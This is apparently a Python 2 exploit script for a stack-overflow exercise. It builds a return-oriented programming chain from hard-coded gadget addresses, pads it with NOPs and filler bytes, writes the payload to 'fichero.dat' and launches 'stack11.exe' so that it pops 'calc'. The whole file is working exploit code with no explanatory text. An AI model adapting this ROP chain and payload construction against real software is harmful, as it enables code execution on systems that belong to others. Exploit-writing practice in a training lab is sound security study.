import struct, subprocess

size = "\xff"
arg2 = "\x48\x47\x46\x45"
arg3 = "\x28\x27\x26\x25"

stack =  struct.pack("<I",0x101014fe) 	# pop esi
stack += struct.pack("<I",0x1010309c)
stack += struct.pack("<I",0x10101450) 	# pop ecx 
stack += struct.pack("<I",0x1010302D)	# 0x10103031 - 4
stack += struct.pack("<I",0x1010164c) 	# mov eax, ecx
stack += struct.pack("<I",0x10101450) 	# pop ecx 
stack += "calc"
stack += struct.pack("<I",0x101017E9) 	# mov [eax+4], ecx
stack += struct.pack("<I",0x10101860) 	# jmp [esi-74]
stack += struct.pack("<I",0x10103031)	# calc
stack += struct.pack("<I",0x10103031)	# calc

payload = "\x90"*8 + stack + "B"*(52-len(stack))
payload += struct.pack("<I", 0x10101a1c)#sub esp
payload += "AAAA" + "BBBB" + struct.pack("<I", 0x10101092) #add esp
payload += "DDDD" + "\x38\x00\x00\x00" # sub esp, eax

buf = payload + "\x90"*(100-(len(payload)))

f = open('fichero.dat', 'wb')
f.write(size + arg2 + arg3 + buf)
f.flush()
f.close()

subprocess.Popen("stack11.exe")